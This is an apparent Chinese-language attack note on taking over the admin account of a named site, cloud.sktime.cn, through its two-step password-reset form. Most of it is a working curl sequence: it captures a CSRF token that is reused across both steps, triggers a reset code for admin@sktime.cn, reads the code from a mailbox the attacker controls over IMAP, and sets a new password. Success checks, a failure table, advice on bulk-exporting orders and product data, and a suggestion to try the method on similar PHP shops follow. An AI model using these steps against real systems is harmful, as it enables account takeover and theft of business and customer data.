# cloud.sktime.cn /forgot.php 后台口令无交互重置

## 原理 / 缺陷点

找回口令是两步表单，但服务端把「防重放」只做了一半：

1. 第一步 `POST /forgot.php` 只校验 `_csrf` + `email`，然后向该邮箱下发 6 位数字码（10 分钟有效）。
2. 第二步 `POST /forgot.php?step=2&email=<urlencoded email>` 校验 `_csrf` + `email` + `code` + `password`。
3. **`_csrf` 跨步复用、不随 step 轮换**，第二步对 CSRF 令牌不做一次性消费。

因此只要攻击者能读该邮箱，整个流程可全自动跑完，无需任何既有口令、无需会话、无需人工。

同时缺：图形验证码（只在后台登录页有 4 字符码）、发码频率限制、账号锁定。

## 前置

- 已控制注册邮箱的 IMAP 收件权（例：`imap.exmail.qq.com:993`，SSL，用邮箱口令登录，`imaplib.IMAP4_SSL` 轮询 INBOX 按 UID 增量取最新信）。
- 该站默认 schannel TLS 协商失败，curl 必须显式降协议：`--tlsv1.2 --tls-max 1.2`，否则 `curl(35) SEC_E_INTERNAL_ERROR`。
- 有 IP 时用 `--resolve <host>:443:<ip>` 规避 DNS/代理：`--noproxy "*"`。

## 复现（curl，两条腿并行）

```bash
BASE=https://cloud.sktime.cn
HOST_RES="--resolve cloud.sktime.cn:443:103.231.58.20"
TLS="--tlsv1.2 --tls-max 1.2"

# 0) 取第一步页面：拿 PHPSESSID 落在 jar，抓 hidden _csrf
curl.exe -sS -k --noproxy "*" $TLS $HOST_RES -c cj.txt -b cj.txt "$BASE/forgot.php" -o step1.html
CSRF=$(grep -oP 'name="_csrf" value="\K[0-9a-f]+' step1.html)

# 1) 触发发码
curl.exe -sS -k --noproxy "*" $TLS $HOST_RES -b cj.txt -c cj.txt \
  --data-urlencode "_csrf=$CSRF" \
  --data-urlencode "email=admin@sktime.cn" \
  "$BASE/forgot.php" -D hdr_post1.txt -o /dev/null
# 期望：HTTP/1.1 302 Found ; Location: https://cloud.sktime.cn/forgot.php?step=2&email=admin%40sktime.cn

# 2) 读信取码（imap.exmail.qq.com:993 SSL，按 UID 增量，正文正则 6 位数字）
python imap_poll.py            # 输出形如 CODE=891755

# 3) 校验 _csrf 是否跨步复用（step2 表单里应出现同一个值）
curl.exe -sS -k --noproxy "*" $TLS $HOST_RES -b cj.txt "$BASE/forgot.php?step=2&email=admin%40sktime.cn" -o step2.html

# 4) 提交改密（同值 _csrf）
curl.exe -sS -k --noproxy "*" $TLS $HOST_RES -b cj.txt -c cj.txt \
  --data-urlencode "_csrf=$CSRF" \
  --data-urlencode "email=admin@sktime.cn" \
  --data-urlencode "code=891755" \
  --data-urlencode "password=<新口令，≥6 位>" \
  "$BASE/forgot.php?step=2&email=admin%40sktime.cn" -D hdr_post2.txt -o /dev/null
# 期望：HTTP/1.1 302 Found ; Location: https://cloud.sktime.cn/login.php

# 5) 用新口令登录 /login.php（后台只剩 4 字符图形码，OCR/人工一次即可）
```

## 判据

- 阳性：第二步 **302 → /login.php**，且新口令能登录成功。
- 阴性：200 回到 step2 表单页并带错误 toast ⇒ 码错 / 超过 10 分钟 / `_csrf` 与 cookie 会话不匹配。
- 注意：不要只发第二步而不带第一步的 cookie jar —— `_csrf` 与 PHPSESSID 绑定时会话不一致同样回 200。

## 失败常见原因

| 现象 | 原因 |
|---|---|
| curl exit 35 SEC_E_INTERNAL_ERROR | 未加 `--tlsv1.2 --tls-max 1.2` |
| 第一步 200 不跳 step2 | email 不存在于用户表 / `_csrf` 抓错（表单字段名可能不同） |
| 第二步一直 200 | 码过期(>10min)、码读错、`_csrf` 非本次会话、password 少于 6 位 |
| IMAP 登录失败 | 邮箱方已改密或开启了客户端专用密码策略，需同步更新邮箱口令 |

## 横向价值

拿到后台后即可走商品/卡池/订单全量导出；同类自研 PHP 商城（/forgot.php 或 /reset.php 两步表单）都值得先按本条目用 `_csrf` 单次抓取 + 两次提交的方式试穿，重点看下述三点是否成立：① token 是否一次性；② 第二步是否要原口令或二次图形码；③ 发码是否有频控。